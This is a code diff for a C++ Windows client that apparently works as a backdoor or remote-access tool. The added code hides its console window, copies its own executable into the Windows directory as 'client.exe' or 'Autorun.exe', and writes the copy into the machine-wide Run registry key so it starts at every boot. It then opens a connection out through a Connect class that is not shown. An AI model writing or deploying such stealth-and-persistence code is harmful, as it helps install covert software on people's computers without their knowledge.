@@ -1,4 +1,6 @@
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
+#define STRLEN(x) (sizeof(x)/sizeof(TCHAR) - 1)
+
 #include "client.h"
 #include "connect.h"
 #include <windows.h>
@@ -8,30 +10,63 @@
 
 void Client::start_programm() {
 	hide_to_bg();
-	load_to_autorun();
-
 	Connect connect;
 	connect.establish_connection();
 }
 
+bool load_to_autorun() {
+    HKEY hKey = NULL;
+    LONG lResult = 0;
 
-void Client::load_to_autorun() {
+    std::unique_ptr<TCHAR[]> programm_name_temp(new TCHAR[MAX_PATH + 1]);
+    TCHAR* programm_name = programm_name_temp.get();
+    std::unique_ptr<TCHAR[]> win_path_temp(new TCHAR[MAX_PATH + 1]);
+    TCHAR* win_path = win_path_temp.get();
 
-	std::unique_ptr<char[]> programm_name_temp(new char[MAX_PATH]);
-	char* programm_name = programm_name_temp.get();
-	GetModuleFileName(NULL, (LPWSTR)programm_name, MAX_PATH);
+    GetModuleFileName(NULL, programm_name, STRLEN(programm_name));
+    GetWindowsDirectory(win_path, STRLEN(win_path));
+    lstrcat(win_path, L"\\client.exe");
 
-	HKEY h_reg_key;
-
-	if (RegCreateKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_ALL_ACCESS, NULL, &h_reg_key, NULL) == ERROR_SUCCESS)
-	{
-		if (RegSetValueEx(h_reg_key, L"client_conn", NULL, REG_SZ + 1, (LPBYTE)programm_name, sizeof(programm_name)) == ERROR_SUCCESS)
-		{
-			RegCloseKey(h_reg_key);
-		}
-		return;
-	}
+    if (0 == CopyFile(programm_name, win_path, FALSE)) {
+        return FALSE;
+    }
+    lResult = RegOpenKey(
+        HKEY_LOCAL_MACHINE,
+        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+        &hKey);
+    if (ERROR_SUCCESS != lResult) {
+        return FALSE;
+    }
+    RegSetValueEx(hKey, L"client", 0, REG_SZ, (PBYTE)win_path,
+        lstrlen(win_path) * sizeof(TCHAR) + 1);
+    RegCloseKey(hKey);
+    return TRUE;
 }
+
+BOOL SelfAutorun() {
+    HKEY hKey = NULL;
+    LONG lResult = 0;
+    TCHAR szExeName[MAX_PATH + 1];
+    TCHAR szWinPath[MAX_PATH + 1];
+    GetModuleFileName(NULL, szExeName, STRLEN(szExeName));
+    GetWindowsDirectory(szWinPath, STRLEN(szWinPath));
+    lstrcat(szWinPath, L"\\Autorun.exe");
+    if (0 == CopyFile(szExeName, szWinPath, FALSE)) {
+        return FALSE;
+    }
+    lResult = RegOpenKey(
+        HKEY_LOCAL_MACHINE,
+        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+        &hKey);
+    if (ERROR_SUCCESS != lResult) {
+        return FALSE;
+    }
+    RegSetValueEx(hKey, L"Autorun", 0, REG_SZ, (PBYTE)szWinPath,
+        lstrlen(szWinPath) * sizeof(TCHAR) + 1);
+    RegCloseKey(hKey);
+    return TRUE;
+}
+
 
 void Client::hide_to_bg() {
 	HWND hWnd = GetConsoleWindow();
@@ -39,6 +74,9 @@ void Client::hide_to_bg() {
 }
 
 int main() {
-	Client client;
+    Client client;
+    load_to_autorun();
+    MessageBox(NULL, L"Success!", L"client", 0);
 	client.start_programm();
+    ExitProcess(0);
 }
